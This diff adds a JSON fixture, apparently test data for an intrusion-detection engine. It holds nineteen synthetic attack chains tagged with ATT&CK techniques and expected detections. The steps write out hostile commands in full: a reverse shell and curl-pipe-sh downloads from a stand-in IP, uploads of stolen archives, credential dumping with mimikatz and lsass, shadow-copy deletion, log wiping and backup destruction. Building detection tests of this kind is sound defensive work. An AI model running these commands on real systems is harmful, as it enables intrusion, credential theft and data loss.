@@ -1,0 +1,1001 @@
+{
+ "scenarios": [
+  {
+   "id": "chain-linux-webshell-to-exfil",
+   "name": "Linux web server compromise to data theft",
+   "description": "Multi-step synthetic intrusion sequence (linux web server compromise to data theft). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "linux",
+   "tactics": [
+    "Initial Access",
+    "Execution",
+    "Persistence",
+    "Credential Access",
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1505.003",
+    "T1059.004",
+    "T1053.003",
+    "T1003.008",
+    "T1560.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "/var/www/html/uploads/shell.php",
+     "operation": "create"
+    },
+    {
+     "type": "process",
+     "executable": "/bin/sh",
+     "command": "sh -c 'id; uname -a'",
+     "parent_exe": "/usr/sbin/apache2",
+     "uid": 33
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/crontab",
+     "command": "crontab -l | { cat; echo '*/10 * * * * curl -s http://203.0.113.9/b|sh'; } | crontab -",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/bin/cp",
+     "command": "cp /etc/shadow /tmp/.s",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/tar",
+     "command": "tar czf /tmp/.d.tgz /var/www /etc",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl -T /tmp/.d.tgz http://203.0.113.9/up",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1505.003",
+    "T1059.004",
+    "T1053.003",
+    "T1003.008",
+    "T1560.001"
+   ]
+  },
+  {
+   "id": "chain-windows-phish-to-ransom",
+   "name": "Windows phishing to ransomware preparation",
+   "description": "Multi-step synthetic intrusion sequence (windows phishing to ransomware preparation). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "windows",
+   "tactics": [
+    "Initial Access",
+    "Execution",
+    "Persistence",
+    "Credential Access",
+    "Lateral Movement",
+    "Impact"
+   ],
+   "techniques": [
+    "T1566.001",
+    "T1059.001",
+    "T1547.001",
+    "T1003.001",
+    "T1569.002",
+    "T1490"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\cmd.exe",
+     "command": "cmd.exe /c powershell -w hidden -c calc",
+     "parent_exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command": "powershell -nop -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "registry",
+     "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+     "operation": "set",
+     "value_name": "Sync",
+     "value_data": "C:\\Users\\ann\\AppData\\Roaming\\sync\\sync.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Users\\bob\\AppData\\Local\\Temp\\pd.exe",
+     "command": "pd.exe -accepteula -ma lsass.exe C:\\Users\\bob\\AppData\\Local\\Temp\\l.dmp",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Tools\\PsExec.exe",
+     "command": "PsExec.exe \\\\10.0.0.9 -s cmd.exe",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\vssadmin.exe",
+     "command": "vssadmin delete shadows /all /quiet",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1566.001",
+    "T1059.001",
+    "T1547.001",
+    "T1003.001",
+    "T1569.002",
+    "T1490"
+   ]
+  },
+  {
+   "id": "chain-linux-cloud-key-theft",
+   "name": "Container workload to cloud credential theft",
+   "description": "Multi-step synthetic intrusion sequence (container workload to cloud credential theft). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "linux",
+   "tactics": [
+    "Execution",
+    "Credential Access",
+    "Discovery",
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1059.004",
+    "T1552.005",
+    "T1087.004",
+    "T1530"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
+     "parent_exe": "/usr/bin/python3",
+     "uid": 1000
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws iam list-users",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws s3 sync s3://corp-finance /tmp/loot",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1059.004",
+    "T1552.005",
+    "T1087.004",
+    "T1530"
+   ]
+  },
+  {
+   "id": "chain-linux-miner-infection",
+   "name": "Exposed service to cryptominer",
+   "description": "Multi-step synthetic intrusion sequence (exposed service to cryptominer). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "linux",
+   "tactics": [
+    "Initial Access",
+    "Execution",
+    "Defense Evasion",
+    "Persistence",
+    "Impact"
+   ],
+   "techniques": [
+    "T1190",
+    "T1105",
+    "T1562.001",
+    "T1053.003",
+    "T1496"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/sh",
+     "command": "sh -c 'wget http://203.0.113.9/x -O /tmp/x'",
+     "parent_exe": "/usr/sbin/nginx",
+     "uid": 33
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/wget",
+     "command": "wget http://203.0.113.9/miner -O /tmp/miner",
+     "parent_exe": "/bin/sh"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/systemctl",
+     "command": "systemctl stop auditd falcon-sensor",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    },
+    {
+     "type": "file",
+     "path": "/etc/cron.d/sysstat-update",
+     "operation": "create"
+    },
+    {
+     "type": "process",
+     "executable": "/tmp/xmrig",
+     "command": "xmrig -o stratum+tcp://pool.minexmr.example:4444 -u wallet -p x",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1190",
+    "T1105",
+    "T1562.001",
+    "T1053.003",
+    "T1496"
+   ]
+  },
+  {
+   "id": "chain-win-lolbin-chain",
+   "name": "Living-off-the-land execution and staging",
+   "description": "Multi-step synthetic intrusion sequence (living-off-the-land execution and staging). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "windows",
+   "tactics": [
+    "Execution",
+    "Defense Evasion",
+    "Command and Control",
+    "Collection",
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1218.005",
+    "T1140",
+    "T1105",
+    "T1560.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\mshta.exe",
+     "command": "mshta.exe http://203.0.113.9/payload.hta",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\certutil.exe",
+     "command": "certutil -decode C:\\Users\\Public\\a.b64 C:\\Users\\Public\\a.exe",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\certutil.exe",
+     "command": "certutil -urlcache -split -f http://203.0.113.9/a.exe C:\\Users\\Public\\a.exe",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Program Files\\WinRAR\\rar.exe",
+     "command": "rar a -hpS3cret C:\\Users\\Public\\d.rar C:\\Users\\ann\\Documents\\",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1218.005",
+    "T1140",
+    "T1105",
+    "T1560.001"
+   ]
+  },
+  {
+   "id": "chain-win-domain-takeover",
+   "name": "Domain reconnaissance to credential replication",
+   "description": "Multi-step synthetic intrusion sequence (domain reconnaissance to credential replication). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "windows",
+   "tactics": [
+    "Discovery",
+    "Credential Access",
+    "Lateral Movement",
+    "Persistence"
+   ],
+   "techniques": [
+    "T1069.002",
+    "T1482",
+    "T1003.006",
+    "T1550.002",
+    "T1136.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\net.exe",
+     "command": "net group \"Domain Admins\" /domain",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\nltest.exe",
+     "command": "nltest /domain_trusts /all_trusts",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Tools\\mimikatz.exe",
+     "command": "mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:krbtgt\" exit",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Tools\\mimikatz.exe",
+     "command": "mimikatz.exe \"sekurlsa::pth /user:admin /domain:corp /ntlm:8846f7eaee8fb117ad06bdd830b7586c\" exit",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\net.exe",
+     "command": "net user svc_backup P@ssw0rd! /add",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1069.002",
+    "T1482",
+    "T1003.006",
+    "T1550.002",
+    "T1136.001"
+   ]
+  },
+  {
+   "id": "chain-mac-stealer",
+   "name": "macOS stealer delivery",
+   "description": "Multi-step synthetic intrusion sequence (macos stealer delivery). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "macos",
+   "tactics": [
+    "Execution",
+    "Defense Evasion",
+    "Credential Access",
+    "Persistence",
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1059.002",
+    "T1553.001",
+    "T1555.001",
+    "T1543.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/osascript",
+     "command": "osascript -e 'do shell script \"curl -s http://203.0.113.9/p | sh\"'",
+     "parent_exe": "/bin/zsh"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/xattr",
+     "command": "xattr -d com.apple.quarantine /Users/ann/Downloads/app.app",
+     "parent_exe": "/bin/zsh"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/security",
+     "command": "security dump-keychain -d login.keychain",
+     "parent_exe": "/bin/zsh"
+    },
+    {
+     "type": "file",
+     "path": "/Users/ann/Library/LaunchAgents/com.apple.update.plist",
+     "operation": "create"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl -T /tmp/k.zip http://203.0.113.9/up",
+     "parent_exe": "/bin/zsh"
+    }
+   ],
+   "expect": [
+    "T1059.002",
+    "T1553.001",
+    "T1555.001",
+    "T1543.001"
+   ]
+  },
+  {
+   "id": "chain-linux-ssh-worm",
+   "name": "SSH key theft and lateral spread",
+   "description": "Multi-step synthetic intrusion sequence (ssh key theft and lateral spread). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "linux",
+   "tactics": [
+    "Credential Access",
+    "Lateral Movement",
+    "Persistence"
+   ],
+   "techniques": [
+    "T1552.004",
+    "T1021.004",
+    "T1098.004"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/find",
+     "command": "find / -name id_rsa -o -name '*.pem' 2>/dev/null",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/ssh",
+     "command": "ssh -i /tmp/.k -o StrictHostKeyChecking=no root@10.0.0.12 'id'",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "echo 'ssh-ed25519 AAAAC3Nza attacker@box' >> /home/ann/.ssh/authorized_keys",
+     "parent_exe": "/usr/sbin/sshd"
+    },
+    {
+     "type": "file",
+     "path": "/home/ann/.ssh/authorized_keys",
+     "operation": "modify"
+    }
+   ],
+   "expect": [
+    "T1552.004",
+    "T1021.004",
+    "T1098.004"
+   ]
+  },
+  {
+   "id": "chain-win-defense-impair-wipe",
+   "name": "Defender tampering before destructive activity",
+   "description": "Multi-step synthetic intrusion sequence (defender tampering before destructive activity). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "windows",
+   "tactics": [
+    "Defense Evasion",
+    "Impact"
+   ],
+   "techniques": [
+    "T1562.001",
+    "T1070.001",
+    "T1490",
+    "T1489"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+     "command": "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\wevtutil.exe",
+     "command": "wevtutil cl Security",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\bcdedit.exe",
+     "command": "bcdedit /set {default} recoveryenabled No",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\net.exe",
+     "command": "net stop MSSQLSERVER /y",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1562.001",
+    "T1070.001",
+    "T1490",
+    "T1489"
+   ]
+  },
+  {
+   "id": "chain-linux-container-escape",
+   "name": "Container breakout to host persistence",
+   "description": "Multi-step synthetic intrusion sequence (container breakout to host persistence). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "linux",
+   "tactics": [
+    "Execution",
+    "Privilege Escalation",
+    "Persistence"
+   ],
+   "techniques": [
+    "T1609",
+    "T1611",
+    "T1543.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/docker",
+     "command": "docker exec -it web sh",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/docker",
+     "command": "docker run --privileged -v /:/host alpine chroot /host sh",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "file",
+     "path": "/etc/systemd/system/netcheck.service",
+     "operation": "create"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/systemctl",
+     "command": "systemctl enable --now netcheck.service",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1609",
+    "T1611",
+    "T1543.002"
+   ]
+  },
+  {
+   "id": "chain-win-rdp-intrusion",
+   "name": "RDP initial access to staging",
+   "description": "Multi-step synthetic intrusion sequence (rdp initial access to staging). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "windows",
+   "tactics": [
+    "Initial Access",
+    "Discovery",
+    "Persistence",
+    "Collection"
+   ],
+   "techniques": [
+    "T1133",
+    "T1033",
+    "T1136.001",
+    "T1560.001"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "auth",
+     "user": "administrator",
+     "source_ip": "198.51.100.40",
+     "method": "rdp",
+     "outcome": "success"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\whoami.exe",
+     "command": "whoami /all",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\net.exe",
+     "command": "net user helpdesk P@ssw0rd! /add",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Program Files\\WinRAR\\rar.exe",
+     "command": "rar a -hpS3cret C:\\Users\\Public\\d.rar C:\\Users\\ann\\Documents\\",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1133",
+    "T1033",
+    "T1136.001",
+    "T1560.001"
+   ]
+  },
+  {
+   "id": "chain-linux-supply-chain",
+   "name": "Poisoned package to credential theft",
+   "description": "Multi-step synthetic intrusion sequence (poisoned package to credential theft). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "linux",
+   "tactics": [
+    "Initial Access",
+    "Execution",
+    "Credential Access",
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1195.002",
+    "T1552.001",
+    "T1048"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/node",
+     "command": "node install.js && curl -s http://203.0.113.9/p | sh",
+     "parent_exe": "/usr/bin/npm"
+    },
+    {
+     "type": "process",
+     "executable": "/bin/grep",
+     "command": "grep -ri 'password' /var/www --include=*.conf --include=*.env",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/curl",
+     "command": "curl -T /tmp/env.txt http://203.0.113.9/up",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1195.002",
+    "T1552.001",
+    "T1048"
+   ]
+  },
+  {
+   "id": "chain-win-persistence-trio",
+   "name": "Layered Windows persistence",
+   "description": "Multi-step synthetic intrusion sequence (layered windows persistence). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "windows",
+   "tactics": [
+    "Persistence"
+   ],
+   "techniques": [
+    "T1053.005",
+    "T1543.003",
+    "T1546.012"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\schtasks.exe",
+     "command": "schtasks /create /sc minute /mo 5 /tn Updater /tr C:\\Users\\ann\\AppData\\Roaming\\u.exe",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\sc.exe",
+     "command": "sc create WinSvcHelper binPath= C:\\ProgramData\\h.exe start= auto",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "registry",
+     "key": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
+     "operation": "set",
+     "value_name": "Debugger",
+     "value_data": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1053.005",
+    "T1543.003",
+    "T1546.012"
+   ]
+  },
+  {
+   "id": "chain-linux-log-wipe-impact",
+   "name": "Anti-forensics then destruction",
+   "description": "Multi-step synthetic intrusion sequence (anti-forensics then destruction). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "linux",
+   "tactics": [
+    "Defense Evasion",
+    "Impact"
+   ],
+   "techniques": [
+    "T1070.003",
+    "T1070.002",
+    "T1485"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/bin/bash",
+     "command": "history -c && rm -f ~/.bash_history",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/truncate",
+     "command": "truncate -s 0 /var/log/auth.log",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    },
+    {
+     "type": "process",
+     "executable": "/bin/rm",
+     "command": "rm -rf /var/lib/postgresql /srv/backups",
+     "parent_exe": "/bin/bash",
+     "uid": 0
+    }
+   ],
+   "expect": [
+    "T1070.003",
+    "T1070.002",
+    "T1485"
+   ]
+  },
+  {
+   "id": "chain-win-ransom-burst",
+   "name": "Ransomware encryption wave",
+   "description": "Multi-step synthetic intrusion sequence (ransomware encryption wave). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "windows",
+   "tactics": [
+    "Impact"
+   ],
+   "techniques": [
+    "T1486"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f0.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f1.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f2.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f3.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f4.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f5.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f6.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f7.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f8.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\f9.docx.locked",
+     "operation": "rename"
+    },
+    {
+     "type": "file",
+     "path": "C:\\Users\\ann\\Documents\\README_RESTORE_FILES.txt",
+     "operation": "create"
+    }
+   ],
+   "expect": [
+    "T1486"
+   ]
+  },
+  {
+   "id": "chain-linux-c2-tunnel",
+   "name": "Command and control with tunnelling",
+   "description": "Multi-step synthetic intrusion sequence (command and control with tunnelling). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "linux",
+   "tactics": [
+    "Command and Control"
+   ],
+   "techniques": [
+    "T1105",
+    "T1572",
+    "T1090"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/wget",
+     "command": "wget http://203.0.113.9/agent -O /tmp/agent",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/ssh",
+     "command": "ssh -N -R 8080:127.0.0.1:22 tun@203.0.113.9",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/ssh",
+     "command": "ssh -D 1080 -N user@203.0.113.9",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1105",
+    "T1572",
+    "T1090"
+   ]
+  },
+  {
+   "id": "chain-mac-persistence-evasion",
+   "name": "macOS persistence with trust bypass",
+   "description": "Multi-step synthetic intrusion sequence (macos persistence with trust bypass). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "macos",
+   "tactics": [
+    "Persistence",
+    "Defense Evasion"
+   ],
+   "techniques": [
+    "T1543.004",
+    "T1553.001",
+    "T1547.015"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/bin/xattr",
+     "command": "xattr -d com.apple.quarantine /Users/ann/Downloads/app.app",
+     "parent_exe": "/bin/zsh"
+    },
+    {
+     "type": "file",
+     "path": "/Library/LaunchDaemons/com.vendor.helper.plist",
+     "operation": "create"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/bin/osascript",
+     "command": "osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"/tmp/h.app\"}'",
+     "parent_exe": "/bin/zsh"
+    }
+   ],
+   "expect": [
+    "T1543.004",
+    "T1553.001",
+    "T1547.015"
+   ]
+  },
+  {
+   "id": "chain-win-lateral-wmi-smb",
+   "name": "Lateral movement over WMI and SMB",
+   "description": "Multi-step synthetic intrusion sequence (lateral movement over wmi and smb). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "windows",
+   "tactics": [
+    "Lateral Movement",
+    "Execution"
+   ],
+   "techniques": [
+    "T1047",
+    "T1021.002",
+    "T1569.002"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\cmd.exe",
+     "command": "cmd.exe /c copy C:\\Temp\\a.exe \\\\10.0.0.9\\C$\\Windows\\Temp\\a.exe",
+     "parent_exe": "C:\\Windows\\explorer.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+     "command": "wmic /node:10.0.0.9 process call create \"cmd.exe /c C:\\Windows\\Temp\\a.exe\"",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+     "type": "process",
+     "executable": "C:\\Tools\\PsExec.exe",
+     "command": "PsExec.exe \\\\10.0.0.10 -s cmd.exe",
+     "parent_exe": "C:\\Windows\\System32\\cmd.exe"
+    }
+   ],
+   "expect": [
+    "T1047",
+    "T1021.002",
+    "T1569.002"
+   ]
+  },
+  {
+   "id": "chain-cloud-admin-abuse",
+   "name": "Cloud admin takeover and log evasion",
+   "description": "Multi-step synthetic intrusion sequence (cloud admin takeover and log evasion). Data only; nothing is executed.",
+   "kind": "chain",
+   "platform": "linux",
+   "tactics": [
+    "Privilege Escalation",
+    "Defense Evasion",
+    "Exfiltration"
+   ],
+   "techniques": [
+    "T1098.003",
+    "T1562.008",
+    "T1537"
+   ],
+   "benign": false,
+   "steps": [
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws iam attach-user-policy --user-name dev --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws cloudtrail stop-logging --name main",
+     "parent_exe": "/bin/bash"
+    },
+    {
+     "type": "process",
+     "executable": "/usr/local/bin/aws",
+     "command": "aws ec2 modify-snapshot-attribute --snapshot-id snap-0abc --attribute createVolumePermission --operation-type add --user-ids 123456789012",
+     "parent_exe": "/bin/bash"
+    }
+   ],
+   "expect": [
+    "T1098.003",
+    "T1562.008",
+    "T1537"
+   ]
+  }
+ ]
+}
